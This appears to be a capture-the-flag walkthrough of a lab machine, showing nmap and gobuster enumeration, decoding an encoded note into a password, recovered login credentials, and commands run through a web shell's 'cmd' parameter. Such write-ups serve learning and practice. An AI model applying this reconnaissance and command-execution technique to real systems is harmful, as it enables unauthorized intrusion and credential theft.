**Tristan Gomez**

```
└─$ sudo nmap -sS 10.10.8.110
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-30 12:08 PDT
Nmap scan report for 10.10.8.110
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds

```

//they switch ports on me. 22 is http and 80 is ssh!
`http://10.10.8.110:22/`

```
└─$ gobuster dir -x .php -w directory-list-2.3-small.txt -u http://10.10.8.110:22/                              
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.8.110:22/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/08/30 12:13:25 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 314] [--> http://10.10.8.110:22/assets/]
/recovery.php         (Status: 200) [Size: 943] 
```

```
Note to self - If I ever get locked out I can get back in at /recovery.php! 
  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==
                    
Remember to wish Johny Graves well with his crypto jobhunting! 
His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

// recovery.php
```
 GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  
```

```
Remember that the credentials to the recovery login are hidden on the homepage! 
I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

```
└─$ cat cms*
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY

```

// http://10.10.8.110:22/nnxhweOV/index.php

`GET me a 'cmd' and I'll run it for you Future-Jack. `

// http://10.10.8.110:22/nnxhweOV/index.php?cmd=ls
`GET me a 'cmd' and I'll run it for you Future-Jack. index.php index.php`
                                                 
```
total 16 
drwxr-xr-x 3 root root 4096 Feb 29 2020 . 
drwxr-xr-x 23 root root 4096 Feb 29 2020 .. 
drwxr-x--- 3 jack jack 4096 Feb 29 2020 jack 
-rw-r--r-- 1 root root 408 Feb 29 2020 jacks_password_list
-rw-r--r-- 1 root root 408 Feb 29 2020 jacks_password_list
```
                                           
